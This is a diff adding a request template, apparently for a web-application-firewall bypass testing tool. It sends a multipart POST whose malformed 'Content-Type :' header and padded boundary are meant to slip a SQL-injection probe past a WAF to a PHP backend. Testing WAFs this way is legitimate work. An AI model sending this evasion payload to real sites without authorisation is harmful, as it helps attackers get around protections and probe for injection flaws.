@@ -1,0 +1,19 @@
+# @name: multipart boundary垃圾填充
+# @tags: post,multipart,boundary,garbage,padding,content-type,id,bypass
+# @color: yellow
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: multipart_boundary_garbage_padding
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: Content-Type 冒号前插入空格(Content-Type :)，且 boundary 值后附加分号等任意填充。PHP 提取到真实 boundary=aaa，WAF 可能取到带填充的错误值或因冒号前空格解析失败。参考 do9gy Part2 第2条。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type : multipart/form-data; boundary=aaa;
+
+--aaa
+Content-Disposition: form-data; name="id"
+
+1' and 'a'='a
+--aaa--
